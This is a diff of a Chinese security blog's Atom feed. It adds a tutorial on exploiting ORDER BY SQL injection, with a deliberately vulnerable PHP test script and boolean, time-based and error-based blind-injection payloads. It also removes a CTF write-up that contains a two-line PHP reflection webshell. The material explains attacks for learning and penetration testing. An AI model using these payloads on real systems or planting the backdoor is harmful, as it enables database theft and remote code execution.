@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://xdxd.love/"/>
-  <updated>2016-03-03T14:38:18.000Z</updated>
+  <updated>2016-03-07T06:14:42.000Z</updated>
   <id>http://xdxd.love/</id>
   
   <author>
@@ -13,6 +13,66 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[order by注入点利用方式]]></title>
+    <link href="http://xdxd.love/2016/03/07/order-by%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"/>
+    <id>http://xdxd.love/2016/03/07/order-by注入点利用方式/</id>
+    <published>2016-03-07T02:00:56.000Z</published>
+    <updated>2016-03-07T06:14:42.000Z</updated>
+    <content type="html"><![CDATA[<h1 id="简单测试">简单测试</h1><p>测试代码：</p>
+<pre><code> <span class="php"><span class="preprocessor">&lt;?php</span>
+error_reporting(<span class="number">0</span>);
+<span class="variable">$conn</span> = mysql_connect(<span class="string">'192.168.99.100'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'database\'s username or password error'</span>);
+mysql_select_db(<span class="string">'test'</span>, <span class="variable">$conn</span>) <span class="keyword">OR</span> <span class="keyword">die</span>(<span class="string">"连接数据库失败，未找到您填写的数据库"</span>);
+<span class="variable">$index</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'index'</span>]) ? <span class="variable">$_GET</span>[<span class="string">'index'</span>] : <span class="number">1</span>;
+<span class="variable">$sql</span> = <span class="string">"SELECT * FROM requests ORDER BY $index LIMIT 3"</span>; 
+<span class="comment">//$sql = "SELECT * FROM admin WHERE uid &lt; 10 ORDER BY uid LIMIT $index";</span>
+var_dump(<span class="variable">$sql</span>);
+<span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>, <span class="variable">$conn</span>) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());
+<span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>))
+  {
+  <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;"</span>;
+  <span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span> . <span class="variable">$row</span>[<span class="string">'id'</span>] . <span class="string">"&lt;/td&gt;"</span>;
+  <span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span> . <span class="variable">$row</span>[<span class="string">'url'</span>] . <span class="string">"&lt;/td&gt;"</span>;
+  <span class="keyword">echo</span> <span class="string">"&lt;/tr&gt;"</span>;
+  }
+<span class="keyword">echo</span> <span class="string">"&lt;/table&gt;"</span>;
+    <span class="preprocessor">?&gt;</span></span>
+</code></pre><p>可以通过asc 和desc查看返回数据是否相同来简单判断是否存在orderby注入。</p>
+<p><img src="/images/orderby1.png" alt=""></p>
+<p><img src="/images/orderby2.png" alt=""></p>
+<h1 id="利用方式：">利用方式：</h1><p>order by的语法如下：</p>
+<pre><code>[<span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="comment">{col_name | expr | position}</span>
+  [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ...]
+</code></pre><p>order by后面可以加字段名，表达式和字段的位置，字段的位置需要是整数型。</p>
+<p>盲注：</p>
+<h2 id="知道字段名">知道字段名</h2><p>1，使用 if(1&lt;2,id,domain)或者类似的表达式来布尔盲注或者时间盲注。</p>
+<pre><code>(<span class="operator"><span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (<span class="literal">true</span>) <span class="keyword">then</span> <span class="keyword">id</span> <span class="keyword">else</span> price <span class="keyword">end</span>)
+
+<span class="keyword">if</span>((selectchar(<span class="keyword">substring</span>(table_name,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">limit</span> <span class="number">1</span>)&lt;=<span class="number">128</span>),<span class="keyword">id</span>,price)</span>
+</code></pre><p>条件判断之后选择的字段名，id，domain，不能是1，2，所以一定要知道字段名。猜测是写1，2的话被判断为字符了。</p>
+<h2 id="不需要知道字段名">不需要知道字段名</h2><p>基于order by 1,2 时间盲注：<br>payload:</p>
+<pre><code><span class="built_in">asc</span>,<span class="keyword">if</span>(locate(\<span class="string">''</span>+payload+<span class="string">'\'</span>,substring(user(),<span class="string">'+str(i)+'</span>,<span class="number">1</span>)),<span class="built_in">sleep</span>(<span class="number">3</span>),<span class="number">1</span>)
+</code></pre><p>基于order by 1,2 引起mysql错误进行盲注 </p>
+<p>payload:</p>
+<pre><code>id,<span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="number">1</span>,(select <span class="number">1</span> from information_schema.tables))
+</code></pre><p>当条件为false是，值为select 1 from information_schema.tables，mysql会报错，Subquery returns more than 1 row，导致查询结果为空。</p>
+<p>案例：<a href="http://www.wooyun.org/bugs/wooyun-2010-076151" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-076151</a></p>
+<p>基于 order by rand(true);order by rand(false);返回不同进行盲注<br>payload:rand(ascii(mid(database(),1,1))=109)</p>
+<p>案例：<a href="http://www.wooyun.org/bugs/wooyun-2010-0152570" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0152570</a></p>
+<p>报错注入：</p>
+<p>跟常规报错注入相同</p>
+<h1 id="思考">思考</h1>]]></content>
+    <summary type="html">
+    <![CDATA[<h1 id="简单测试">简单测试</h1><p>测试代码：</p>
+<pre><code> <span class="php"><span class="preprocessor">&lt;?php</span>
+error_reporting(<span class="nu]]>
+    </summary>
+    
+      <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
   
   <entry>
     <title><![CDATA[finecms <= 2.3.0 任意用户密码修改]]></title>
@@ -1067,42 +1127,6 @@ Welcome!
     </summary>
     
       <category term="支付漏洞" scheme="http://xdxd.love/tags/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/"/>
-    
-      <category term="黑盒测试" scheme="http://xdxd.love/categories/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[华山杯CTF做过的几道题]]></title>
-    <link href="http://xdxd.love/2015/11/23/%E5%8D%8E%E5%B1%B1%E6%9D%AFCTF%E5%81%9A%E8%BF%87%E7%9A%84%E5%87%A0%E9%81%93%E9%A2%98/"/>
-    <id>http://xdxd.love/2015/11/23/华山杯CTF做过的几道题/</id>
-    <published>2015-11-23T08:04:35.000Z</published>
-    <updated>2015-11-24T03:27:38.000Z</updated>
-    <content type="html"><![CDATA[<p>花时间做了几道题，感觉还是有收获的。虽然死亡之ping这些知识点不熟悉，web的python题还是学到了不少知识。</p>
-<p>登录的时候会随机报错。查看返回django的调试模式泄露源码。</p>
-<p><img src="/images/huashanctf1.png" alt=""></p>
-<p>通过改变参数多次尝试报错，可以或得部分代码：</p>
-<pre><code>c = json.loads(request.body)
-<span class="keyword">method</span> = getattr(globals()[c['obj']],c['<span class="keyword">method</span>'])
-ret = <span class="keyword">method</span>(c['params'])
-retdata['<span class="literal">result</span>'],retdata['error'] = ret
-</code></pre><p>通过反射的方式来执行对象的函数，而ojb，method和params三个参数都是可控的，这样就可以导致代码执行。具体可以参考<a href="http://www.secpulse.com/archives/40012.html" target="_blank" rel="external">writeup</a></p>
-<p>python <a href="http://stackoverflow.com/questions/12693606/reason-for-globals-in-python" target="_blank" rel="external">globals()</a>返回一个map，这个map的key是全局范围内对象的名字，value是该对象的实例。</p>
-<p>利用php的反射写的后门如下：</p>
-<pre><code><span class="php"><span class="preprocessor">&lt;?php</span>
-    <span class="variable">$func</span> = <span class="keyword">new</span> ReflectionFunction(<span class="variable">$_GET</span>[m]);
-    <span class="keyword">echo</span> <span class="variable">$func</span>-&gt;invokeArgs(<span class="keyword">array</span>(<span class="variable">$_GET</span>[c]));
-<span class="preprocessor">?&gt;</span></span>
-</code></pre><p>可以参考<a href="https://github.com/tennc/webshell/tree/master/php/p2j" target="_blank" rel="external">php反射后门</a></p>
-<p>还有做的两个题就是分析流量。感觉还是比较有意思，在网络包种寻找信息，有点侦探的感觉。一个tips就是发现base64编码的密码，使用burpsuite的decode解码base64是乱码，以为不是base64，卡半天想不出来。其实是因为是中文做的base64编码，使用在线的base64解码工具可以直接解出中文。看来以前很多看起来像base64，但是decode是乱码，很可能是因为编码不对啊。<a href="http://sudalover.com/?p=155" target="_blank" rel="external">writeup</a></p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p>花时间做了几道题，感觉还是有收获的。虽然死亡之ping这些知识点不熟悉，web的python题还是学到了不少知识。</p>
-<p>登录的时候会随机报错。查看返回django的调试模式泄露源码。</p>
-<p><img src="/images/huashanctf1.png]]>
-    </summary>
-    
-      <category term="ctf" scheme="http://xdxd.love/tags/ctf/"/>
     
       <category term="黑盒测试" scheme="http://xdxd.love/categories/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
     
